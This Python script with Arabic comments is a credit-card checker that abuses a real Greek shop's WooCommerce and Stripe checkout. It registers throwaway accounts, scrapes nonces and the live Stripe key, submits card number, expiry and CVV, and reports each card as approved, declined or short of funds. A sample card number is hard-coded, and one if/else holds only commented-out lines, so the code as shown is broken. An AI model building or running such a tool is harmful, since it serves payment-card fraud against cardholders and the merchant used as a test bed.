import requests
import re
import uuid
import random
import time
from user_agent import generate_user_agent

def Stripe3(ccx):
    """
    فحص بطاقة على seliniaction.com.gr (Stripe - Auth - Register with email only)
    ccx: رقم|شهر|سنة|cvv
    """
    try:
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        
        if "20" in yy:
            yy = yy.split("20")[1]
        if len(yy) == 2:
            yy_full = f"20{yy}"
        else:
            yy_full = yy
        
        n = n.replace(" ", "")
        
        user = generate_user_agent()
        r = requests.Session()
        site_url = "https://seliniaction.com.gr"
        
        #print("\n" + "="*60)
        #print(f"🔥 فحص: {n[:4]}...|{mm}|{yy}|{cvc}")
        #print("="*60)
        
        # ===== 1. فتح صفحة الحساب =====
        #print("\n[1/6] فتح صفحة الحساب...")
        headers = {
            'authority': 'seliniaction.com.gr',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'referer': f'{site_url}/my-account/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        response = r.get(f'{site_url}/my-account/', headers=headers)
        #print(f"    ✅ HTTP {response.status_code}")
        
        reg = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text)
        if not reg:
            return "❌ Register nonce not found"
        reg = reg.group(1)
        #print(f"    🔑 Register nonce: {reg}")
        
        # ===== 2. تسجيل حساب جديد (إيميل فقط) =====
        #print("\n[2/6] تسجيل حساب جديد...")
        email = f"u_{uuid.uuid4().hex[:8]}@gmail.com"
        #print(f"    📧 {email}")
        
        headers = {
            'authority': 'seliniaction.com.gr',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': site_url,
            'referer': f'{site_url}/my-account/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        data = {
            'email': email,
            'woocommerce-register-nonce': reg,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        
        response = r.post(f'{site_url}/my-account/', headers=headers, data=data)
        #print(f"    ✅ تم التسجيل ({response.status_code})")
        
        # ===== 3. فتح صفحة إضافة البطاقة =====
        #print("\n[3/6] فتح صفحة إضافة البطاقة...")
        headers = {
            'authority': 'seliniaction.com.gr',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': f'{site_url}/my-account/payment-methods/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        response = r.get(f'{site_url}/my-account/add-payment-method/', headers=headers)
        html = response.text
        #print(f"    ✅ HTTP {response.status_code}")
        
        pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', html)
        if not pk_live:
            return "❌ Stripe key not found"
        pk_live = pk_live.group(1)
        #print(f"    🔑 pk_live found")
        
        addnonce = re.search(r'name="_ajax_nonce" value="(.*?)"', html)
        if not addnonce:
            addnonce = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', html)
            if not addnonce:
                return "❌ AJAX nonce not found"
            addnonce = addnonce.group(1)
        else:
            addnonce = addnonce.group(1)
        #print(f"    🔑 AJAX nonce: {addnonce}")
        
        stripe_account = re.search(r'(acct_[A-Za-z0-9_-]+)', html)
        acct = f'&_stripe_account={stripe_account.group(1)}' if stripe_account else ''
        if stripe_account:
            #print(f"    🔑 stripe_account: {stripe_account.group(1)}")
        else:
            #print(f"    ⚠️ stripe_account not found")
        
        # ===== 4. جلب معرفات Stripe =====
        #print("\n[4/6] جلب معرفات Stripe...")
        headers = {
            'authority': 'm.stripe.com',
            'accept': '*/*',
            'content-type': 'text/plain;charset=UTF-8',
            'origin': 'https://m.stripe.network',
            'referer': 'https://m.stripe.network/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        response = r.post('https://m.stripe.com/6', headers=headers, data='')
        try:
            detet = response.json()
            guid = detet.get('guid', str(uuid.uuid4()))
            muid = detet.get('muid', str(uuid.uuid4()))
            sid = detet.get('sid', str(uuid.uuid4()))
            #print(f"    ✅ GUID, MUID, SID obtained")
        except:
            guid = str(uuid.uuid4())
            muid = str(uuid.uuid4())
            sid = str(uuid.uuid4())
            #print(f"    ⚠️ Generated identifiers")
        
        client_session_id = str(uuid.uuid4())
        elements_session_config_id = str(uuid.uuid4())
        times = random.randint(10000, 99999)
        
        # ===== 5. إرسال البطاقة إلى Stripe =====
        #print("\n[5/6] إرسال البطاقة إلى Stripe...")
        headers_stripe = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        
        stripe_data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_full}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=GR&payment_user_agent=stripe.js%2Ff1af8b7877%3B+stripe-js-v3%2Ff1af8b7877%3B+payment-element%3B+deferred-intent&referrer={site_url}&time_on_page={times}&client_attribution_metadata[client_session_id]={client_session_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]={elements_session_config_id}&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid={guid}&muid={muid}&sid={sid}&key={pk_live}{acct}&_stripe_version=2024-06-20'
        
        response = r.post('https://api.stripe.com/v1/payment_methods', data=stripe_data, headers=headers_stripe)
        
        try:
            resp_json = response.json()
            if 'id' not in resp_json:
                error_msg = resp_json.get('error', {}).get('message', 'Unknown')
                #print(f"    ❌ Stripe Error: {error_msg}")
                return f"❌ Stripe Error: {error_msg}"
            payment_id = resp_json['id']
            #print(f"    ✅ Payment Method: {payment_id}")
        except Exception as e:
            return f"❌ Could not create payment method: {str(e)}"
        
        # ===== 6. تأكيد setup intent =====
        #print("\n[6/6] تأكيد Setup Intent...")
        headers_final = {
            'authority': 'seliniaction.com.gr',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': site_url,
            'referer': f'{site_url}/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': addnonce,
        }
        
        response = r.post(f'{site_url}/wp-admin/admin-ajax.php', data=data, headers=headers_final)
        text = response.text
        
        #print("\n" + "="*60)
        #print(f"📄 Response: {text[:200]}")
        #print("="*60)
        
        # ===== 7. تحليل النتيجة =====
        if 'card was declined' in text.lower() or 'Your card could not be set up' in text:
            result = 'Declined ❌'
        elif 'Your card number is incorrect.' in text:
            result = 'Card number is incorrect ❌'
        elif 'success' in text.lower() or '"success":true' in text:
            result = 'Approved ✅'
        elif 'duplicate' in text.lower():
            result = 'Approved (Duplicate) ✅'
        elif 'insufficient_funds' in text.lower():
            result = 'Insufficient Funds 💰'
        else:
            try:
                error_msg = response.json().get('data', {}).get('error', {}).get('message', '')
                if error_msg:
                    result = f'Error ❌: {error_msg}'
                else:
                    result = 'Declined ❌'
            except:
                result = 'Declined ❌'
        
        print(f"\n📊 النتيجة: {result}")
        return result
        
    except Exception as e:
        return f'Error ❌: {str(e)}'


if __name__ == '__main__':
    test_card = "4113520064450631|04|2030|399"
    result = Stripe3(test_card)
    print(result)